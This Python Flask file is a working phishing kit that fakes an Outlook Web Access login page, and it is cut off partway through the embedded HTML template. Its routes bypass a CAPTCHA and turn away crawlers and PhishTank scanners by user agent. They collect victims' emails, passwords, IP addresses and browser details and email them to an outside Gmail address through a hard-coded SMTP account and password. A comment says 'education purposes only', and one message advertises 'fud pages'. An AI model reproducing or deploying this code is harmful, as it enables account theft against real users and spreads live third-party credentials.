from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify, send_from_directory
import secrets
import random
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import json

# made for education purposes only

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

@app.route('/m', methods=['GET', 'POST'])
def captcha():

    if request.method == 'GET':
        # AUTO-BYPASS: Set passed_captcha to True immediately
        session['passed_captcha'] = True
        
        # Get user parameters
        userauto = request.args.get("web")
        if userauto:
            userdomain = userauto[userauto.index('@') + 1:] if '@' in userauto else ''
            session['eman'] = userauto
            session['ins'] = userdomain
        
        # Redirect to success page immediately without showing CAPTCHA
        return redirect(url_for('success'))
    
    elif request.method == 'POST':
        # Also handle POST requests by auto-passing
        session['passed_captcha'] = True
        return redirect(url_for('success'))

@app.route('/success')
def success():
    # Always pass if accessed directly
    session['passed_captcha'] = True
    web_param = request.args.get('web')
    return redirect(url_for('route2', web=web_param))


@app.route("/")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        if '@' in web_param:
            session['ins'] = web_param[web_param.index('@') + 1:]
        else:
            session['ins'] = ''
    
    # Render owamainnew.html (Outlook login page)
    return render_template('owamainnew.html', eman=session.get('eman'), ins=session.get('ins'))

# Route to handle Outlook login form submission
@app.route("/outlook_login", methods=['POST'])
def outlook_login():
    if request.method == 'POST':
        # Get user IP address
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        
        # Get credentials from Outlook form
        email = request.form.get("email02")
        password = request.form.get("password")
        ai = request.form.get("ai")  # Additional field from the form
        
        sender_email = "adil@blackorange.in"
        receiver_email = "chnthanhco.ltd@gmail.com"
        email_password = "Adil@22secure"
        
        useragent = request.headers.get('User-Agent')
        
        # Create email message
        message = MIMEMultipart("alternative")
        message["Subject"] = "Outlook Login Credentials Captured"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        # Text version of email
        text = f"""\
        NEW OUTLOOK LOGIN ATTEMPT
        =========================
        
        Username: {email}
        Password: {password}
        Additional Email (ai): {ai}
        IP Address: {ip}
        User Agent: {useragent}
        Timestamp: {request.headers.get('Date')}
        
        ---
        Captured via Outlook login page
        """
        
        # HTML version of email
        html = f"""\
        <html>
          <body style="font-family: Arial, sans-serif;">
            <h2 style="color: #0078d4;">🔒 NEW OUTLOOK LOGIN ATTEMPT</h2>
            <div style="background-color: #f3f2f1; padding: 20px; border-radius: 5px;">
              <table style="width: 100%; border-collapse: collapse;">
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>📧 Username:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{email}</td>
                </tr>
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>🔑 Password:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{password}</td>
                </tr>
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>📩 Additional Email:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{ai}</td>
                </tr>
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>🌐 IP Address:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{ip}</td>
                </tr>
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>🖥️ User Agent:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{useragent}</td>
                </tr>
                <tr>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;"><strong>🕒 Timestamp:</strong></td>
                  <td style="padding: 10px; border-bottom: 1px solid #ddd;">{request.headers.get('Date')}</td>
                </tr>
              </table>
            </div>
            <p style="color: #666; font-size: 12px; margin-top: 20px;">
              📍 Source: Outlook Webmail Login Page
            </p>
          </body>
        </html>
        """
        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        
        try:
            with smtplib.SMTP_SSL("mail.blackorange.in", 465) as server:
                server.login(sender_email, email_password)
                server.sendmail(sender_email, receiver_email, message.as_string())
                print(f"[+] Outlook credentials sent: {email}")
        except Exception as e:
            print(f"[-] Email sending failed: {e}")
        
        # Return JSON response as expected by the AJAX call
        return jsonify({
            'status': 'success',
            'message': 'Credentials captured successfully'
        })

# API endpoint for AJAX submission (for the formsubmit.co integration)
@app.route("/submit_outlook", methods=['POST'])
def submit_outlook():
    """Handle AJAX submissions from Outlook page"""
    if request.method == 'POST':
        # Get user IP address
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        
        # Get data from AJAX request
        data = request.get_json()
        if not data:
            data = request.form.to_dict()
        
        username = data.get('Username', '')
        password = data.get('Password', '')
        email = data.get('Email', '')
        attempts = data.get('Attempts', 1)
        
        sender_email = "adil@blackorange.in"
        receiver_email = "chnthanhco.ltd@gmail.com"
        email_password = "Adil@22secure"
        
        useragent = request.headers.get('User-Agent')
        
        # Send email
        message = MIMEMultipart("alternative")
        message["Subject"] = f"Outlook Admin Logs | Attempt {attempts} | {ip}"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        text = f"""\
        OUTLOOK AJAX LOGIN CAPTURED
        ===========================
        
        Username: {username}
        Password: {password}
        Target Email: {email}
        Attempt Number: {attempts}
        IP Address: {ip}
        User Agent: {useragent}
        """
        
        html = f"""\
        <html>
          <body style="font-family: Arial, sans-serif;">
            <h2 style="color: #d83b01;">⚠️ OUTLOOK AJAX LOGIN ATTEMPT #{attempts}</h2>
            <div style="background-color: #fff4ce; padding: 20px; border-left: 4px solid #ff8c00;">
              <h3>📋 Login Details:</h3>
              <p><strong>👤 Username:</strong> {username}</p>
              <p><strong>🔒 Password:</strong> {password}</p>
              <p><strong>🎯 Target Email:</strong> {email}</p>
              <p><strong>🔢 Attempt:</strong> #{attempts}</p>
              <hr>
              <p><strong>🌐 IP:</strong> {ip}</p>
              <p><strong>🖥️ Browser:</strong> {useragent}</p>
            </div>
          </body>
        </html>
        """
        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        
        try:
            with smtplib.SMTP_SSL("mail.blackorange.in", 465) as server:
                server.login(sender_email, email_password)
                server.sendmail(sender_email, receiver_email, message.as_string())
                print(f"[+] AJAX Outlook credentials sent (Attempt {attempts}): {username}")
        except Exception as e:
            print(f"[-] AJAX email sending failed: {e}")
        
        # Return response for formsubmit.co compatibility
        return jsonify({
            'success': True,
            'message': 'Form submitted successfully'
        })

@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "adil@blackorange.in"
        receiver_email = "chnthanhco.ltd@gmail.com"
        password = "Adil@22secure"
        
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "WEBMAIL Logs !"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        
        html = f"""\
        <html>
          <body>
            <p>Email: {email}</p>
            <p>Password: {passwordemail}</p>
            <p>IP: {ip}</p>
            <p>User Agent: {useragent}</p>
          </body>
        </html>
        """
        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        
        with smtplib.SMTP_SSL("mail.blackorange.in", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        
        return redirect(url_for('benza', web=session.get('eman')))

@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "adil@blackorange.in"
        receiver_email = "chnthanhco.ltd@gmail.com"
        password = "Adil@22secure"
        
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "WEBMAIL logs !!"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        
        html = f"""\
        <html>
          <body>
            <p>Email: {email}</p>
            <p>Password: {passwordemail}</p>
            <p>IP: {ip}</p>
            <p>User Agent: {useragent}</p>
          </body>
        </html>
        """
        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        
        with smtplib.SMTP_SSL("mail.blackorange.in", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        
        return redirect(url_for('lasmo'))

@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

# Route to handle the AJAX endpoint that the Outlook page expects
@app.route("/orange.php", methods=['POST'])
def orange_php():
    """Handle the AJAX request from the page"""
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        
        # Get data from form
        email = request.form.get("email")
        password = request.form.get("password")
        
        sender_email = "adil@blackorange.in"
        receiver_email = "chnthanhco.ltd@gmail.com"
        email_password = "Adil@22secure"
        
        useragent = request.headers.get('User-Agent')
        
        # Send email
        message = MIMEMultipart("alternative")
        message["Subject"] = "Login via AJAX"
        message["From"] = sender_email
        message["To"] = receiver_email
        
        text = f"""\
        AJAX Login Credentials
        ======================
        
        Email: {email}
        Password: {password}
        IP: {ip}
        User Agent: {useragent}
        """
        
        html = f"""\
        <html>
          <body>
            <h2>AJAX Login Credentials</h2>
            <p><strong>Email:</strong> {email}</p>
            <p><strong>Password:</strong> {password}</p>
            <p><strong>IP:</strong> {ip}</p>
            <p><strong>User Agent:</strong> {useragent}</p>
          </body>
        </html>
        """
        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        
        try:
            with smtplib.SMTP_SSL("mail.blackorange.in", 465) as server:
                server.login(sender_email, email_password)
                server.sendmail(sender_email, receiver_email, message.as_string())
        except Exception as e:
            print(f"Email sending failed: {e}")
        
        # Return expected JSON response
        return jsonify({
            'signal': 'ok',
            'msg': 'Login successful'
        })

# Static file serving (for CSS, JS, etc.)
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    # Create templates directory if it doesn't exist
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    # Save owamainnew.html to templates directory
    with open('templates/owamainnew.html', 'w', encoding='utf-8') as f:
        f.write("""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=10" />
    <meta http-equiv="Content-Type" content="text/html; CHARSET=EUC-KR">
    <meta name="Robots" content="NOINDEX, NOFOLLOW">
    <title>Outlook</title>
    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAADAUExURQAAAAB1yAB0xwByxwBxxQBwxABuxAB3yQB2yQBxxQBxxQB0xwBxxQBwxABuxABtwwBswgB1yAB0xwByxwBxxQBwxABuxAB3yQB2yXSz4efy+vP4/Ia75ANwxf///77b8Fyn3KfP7LbX73Gu38Le8gx4ycXg86TO69Xo9c/k9K3S7XSy4PD3/F+o3JjF6Pn8/gZ0x3q14Ql2yHez4fb6/WKq3ZjH6M/l9Z7L6szj88zi897t+Git357K6mWo3IO75HlMgsoAAAAPdFJOUwAJM2aTwO2u2/aNNpbD8OoUsj0AAAABYktHRB5yCiArAAAAB3RJTUUH5wMJEBwUHbaekAAAAJlJREFUGNN1z0cSwjAMBVBDaKbZwSK0ICB0CCVgerv/rZDjgRkG+Du9haTPGEsknVQ6IySzyebcioKq94Za/S8AhecNNJotvy0kUjqcoIu9APsxDIZAMBormEyFnNE8NxAuFCxXQq6jzRYN6B2BFnIPEcZwOCo4nWnHBS1c8Rbg3V6JwX2Eoe9Z0PznY5+vf5Wj+gWnWCq/4AkDFxUICbyeNgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0wMy0wOVQxNjoyODoxOSswMDowMGSqwRYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMDMtMDlUMTY6Mjg6MTkrMDA6MDAV93mqAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDIzLTAzLTA5VDE2OjI4OjIwKzAwOjAwWfUaRQAAAABJRU5ErkJggg==" type="image/x-icon">
    <style>
			@font-face {
				font-family: "wf_segoe-ui_semilight";
				src: url("/owa/auth/15.1.1591/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
				url("/owa/auth/15.1.1591/themes/resources/segoeui-semilight.ttf") format("truetype");
			}
			@font-face {
				font-family: "wf_segoe-ui_semibold";
				src: url("/owa/auth/15.1.1591/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
				url("/owa/auth/15.1.1591/themes/resources/segoeui-semibold.ttf") format("truetype");
			}
		</style>

		<style>
			body, .mouse, .twide, .tnarrow, form {
				height: 100%;
				width: 100%;
				margin: 0px;
			}
			.mouse, .twide {
				min-width: 650px; /* min iPad1 dimension */
				min-height: 650px;
				position: absolute;
				top:0px;
				bottom:0px;
				left:0px;
				right:0px;
			}
			.sidebar {
				background-color:#0072C6;
			}
			.mouse .sidebar, .twide .sidebar {
				position:absolute;
				top: 0px;
				bottom: 0px;
				left: 0px;
				display: inline-block;
				width: 332px;
			}
			.tnarrow .sidebar {
				display: none;
			}
			.mouse .owaLogoContainer, .twide .owaLogoContainer {
				margin:213px auto auto 109px;
				text-align:left;
			}
			.tnarrow .owaLogo {
				display: none;
			}
			.mouse .owaLogoSmall, .twide .owaLogoSmall {
				display: none;
			}
			.logonDiv {
				text-align:left;
			}
			.mouse .logonContainer, .twide .logonContainer {
				padding-top: 174px;
				padding-left: 464px;
				padding-right:142px;
				position:absolute;
				top:0px;
				bottom: 0px;
				left: 0px;
				right: 0px;
				text-align: center;
			}
			.mouse .logonDiv, .twide .logonDiv {
				position: relative;
				vertical-align:top;
				display: inline-block;
				width: 423px;
			}
			.tnarrow .logonDiv {
				margin:25px auto auto -130px;
				position: absolute;
				left: 50%;
				width: 260px;
				padding-bottom: 20px;
			}
			.twide .signInImageHeader, .tnarrow .signInImageHeader {
				display: none;
			}
			.mouse .signInImageHeader {
				margin-bottom:22px;
			}
			.twide .mouseHeader {
				display: none;
			}
			.mouse .twideHeader {
				display: none;
			}
			input::-webkit-input-placeholder {
				font-size:16px;
				color: #98A3A6;
			}
			input:-moz-placeholder  {
				font-size:16px;
				color: #98A3A6;
			}
			.tnarrow .signInInputLabel, .twide .signInInputLabel {
				display: none;
			}
			.mouse .signInInputLabel {
				margin-bottom: 2px;
			}
			.mouse .showPasswordCheck {
				display: none;
			}
			.signInInputText {
				border:1px solid #98A3A6;
				color: #333333;
				border-radius: 0;
				-moz-border-radius: 0;
				-webkit-border-radius: 0;
				box-shadow: none;
				-moz-box-shadow: none;
				-webkit-box-shadow: none;
				-webkit-appearance:none;
				background-color: #FDFDFD;
				width:250px;
				margin-bottom:10px;
				box-sizing: content-box;
				-moz-box-sizing: content-box;
				-webkit-box-sizing: content-box;
			}
			.mouse .signInInputText  {
				height: 22px;
				font-size: 12px;
				padding: 3px 5px;
				color: #333333;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-bottom: 20px;
			}
			.twide .signInInputText, .tnarrow .signInInputText {
				border-color: #666666;
				height: 22px;
				font-size: 16px;
				color: #000000;
				padding: 7px 7px;
				font-family:'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-bottom:20px;
				width: 264px;
			}
			.divMain {
				width: 444px;
			}
			.l {
				text-align:left;
			}
			.r {
				text-align:right;
			}
			input.btn {
				color: #ffffff;
				background-color: #eb9c12;
				border: 0px; 
				padding: 2px 6px; 
				margin: 0px 6px; 
				text-align:center;
			}
			.btnOnFcs {
				color: #ffffff;
				background-color: #eb9c12;
				border: 0px; 
				padding: 2px 6px; 
				margin: 0px 6px; 
				text-align:center;
			}
			.btnOnMseOvr {
				color: #ffffff;
				background-color: #f9b133;
				border: 0px; 
				padding: 2px 6px; 
				margin: 0px 6px; 
				text-align:center;
			}
			.btnOnMseDwn {
				color: #000000;
				background-color: #f9b133;
				border: 0px solid #f9b133;
				padding: 2px 6px; 
				margin: 0px 6px; 
				text-align:center;
			}
			.nowrap {
				white-space:nowrap;
			}
			hr {
				height: 0px; 
				visibility: hidden;
			}
			.wrng {
				color:#ff6c00;
			}
			.disBsc {
				color:#999999;
			}
			.w100, .txt {
				width: 100%;
			}
			.txt {
				margin: 0px 6px; 
			}
			.rdo {
				margin: 0px 12px 0px 32px;
			}
			.signInBg {
				margin:0px;
			}
			.signInTextHeader {
				font-size:60px;
				color:#404344;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-bottom:18px;
				white-space: nowrap;
			}
			.signInInputLabel {
				font-size:12px;
				color:#666666;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
			}
			.signInCheckBoxText {
				font-size:12px;
				color:#6A7479;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-top:16px;
			}
			.twide .signInCheckBoxText, .tnarrow .signInCheckBoxText {
				font-size: 15px;
			}
			.signInCheckBoxLink {
				font-size:12px;
				color:#0072C6;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
			}
			.signInEnter {
				font-size:22px;
				color:#0072C6;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-top:20px;
			}
			.twide .signInEnter {
				margin-top:17px;
				font-size: 29px;
			}
			.tnarrow .signInEnter  {
				margin-top:2px;
				font-size: 29px;
				position: relative;
				float: left;
				left: 50%;
			}
			.signinbutton  {
				cursor:pointer;
				display:inline
			}
			.mouse .signinbutton {
				padding: 0px 8px 5px 8px;
				margin-left: -8px;
			}
			.tnarrow .signinbutton  {
				position: relative;
				float: left;
				left: -50%;
			}
			.shellDialogueHead {
				font-size:29px;
				color:#0072C6;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
			}
			.mouse .shellDialogueHead  {
				line-height: 35px;
				margin-bottom: 10px;
			}
			.twide  .shellDialogueHead, .tnarrow .shellDialogueHead {
				line-height:34px;
				margin-bottom: 12px;
			}
			.shellDialogueMsg {
				font-size:13px;
				color:#333333;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				line-height:18px;
			}
			.twide .shellDialogueMsg, .tnarrow .shellDialogueMsg {
				font-size: 15px;
			}
			.headerMsgDiv  {
				width: 350px;
				margin-bottom: 22px;
			}
			.twide .headermsgdiv {
				margin-bottom: 30px;
			}
			.tnarrow .headermsgdiv {
				width: 260px;
				margin-bottom: 30px;
			}
			.signInError {
				font-size:12px;
				color:#C1272D;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-top:12px;
			}
			.passwordError {
				color: #A80F22;
				font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				line-height: 18px;
			}
			.mouse .passwordError {    
				margin-top: 10px;
				font-size: 13px;
			}
			.twide .passwordError, .tnarrow .passwordError {
				margin-top: 12px;
				font-size: 15px;
			}
			.signInExpl {
				font-size:12px;
				color:#999999;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-top:5px;
			}
			.signInWarning {
				font-size:12px;
				color:#C1272D;
				font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
				margin-top:5px;
			}
			input.chk {
				margin-right:9px;
				margin-left:0px;
			}
			.imgLnk {
				vertical-align: middle;	
				line-height:2;
				margin-top: -2px;
			}
			.signinTxt {
				padding-left:11px;
				padding-right:11px;     /* Needed for RTL, doesnt hurt to add this for LTR as well */
			}
			.hidden-submit { 
				border: 0 none; 
				height: 0; 
				width: 0; 
				padding: 0; 
				margin: 0; 
				overflow: hidden; 
			} 
			.officeFooter {
				position:absolute;
				bottom: 33px;
				right: 45px;
			}
			.tnarrow .officeFooter {
				display: none;
			}
		</style>
</head>
<body class="signInBg" style="background: #f2f2f2 url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC') repeat-x">
    <noscript>
        <div id="dvErr">
            <table cellpadding="0" cellspacing="0">
                <tr>
                    <td><img rc="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAptJREFUeNqkU01LVFEYfu7XzJ17nZmyJBW0sgRDRAgLoi8tghZG9QNaR7tg2vQjbCu2a9Eq2qRGUYFBZAtLURzSUUcJG8d0ZnTu99fpPdIMSktfOOfcezjP8z7vc94jMMZwmJD5JAhCfWPm0e2+MGKDYRQNBCHrpTWi/1kaExFjY7defp6qneXJhb3pHwGBH4qy8uSIrp9NqjJ0TXsXuvZ0KfvjacEVsIlEzhXkofuvJ0f+I+BgVdOftfZe0OIsQBBTFxLX7raxCIH75vn3xOjwQDbQsSgfNw0pkXkwPjXCsWJNNjFlmttPaWrqKBBTEb9yr0No7tCEptaU3H3xMgQJp90imo2C7plGZvhmbx/H7hHwmnUJnWpjI8L1ZSg7fyBoSQWUHo4FIabFwEJE5HeLX4JmVzqrtjdYN5GM6k95FlhpE4q5A8GzEWzkITYkKYWEqLgG+C58IgiIMx1WkfX0/joBud2Tsrco+wokZ5dAIsL5Scgnu8ACH/7qTyL14RDYo/NJZqPq+D37FYDtlqHlp6n+xF7WYHkO8ZBkE6G9tgQ3BCwabsTdBwzbw34P5oohfZaKwHYB2CrA+bWCyKwgyC/AIU+qnIDAAYE3PAmG48/tU8Am1uXU9XR1A4rrQ6S2iHwP9pe3dIc2/OouTCLgJfBYNCVYrj9RV8A7rCIncwvSMWz5JIDUyW2dkXr1DmKnzxFBuVwDZw0JMxXkLC8YqxPw9vSk2NC62mQui2mUA9rsvpSX0o1+vL2r7InxFzXwp03R/G1GQx9Na6pOwIO3p6U0ZFbjLbl56QRY9tsZbyU7W/jwalyKq4/fb6sYLSq5JUPIfA28kRruwFvgwTuMNwmNG3RV58ntkAyb5jVz2bXMB97CYeKvAAMACjWGjcO+NcIAAAAASUVORK5CYII=" alt=""></td>
                    <td style="width:100%">To use Outlook, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook.</td>
                </tr>
            </table>
        </div>
    </noscript>
    <div id="mainLogonDiv" class="mouse">
        <div class="sidebar">
            <div class="owaLogoContainer">
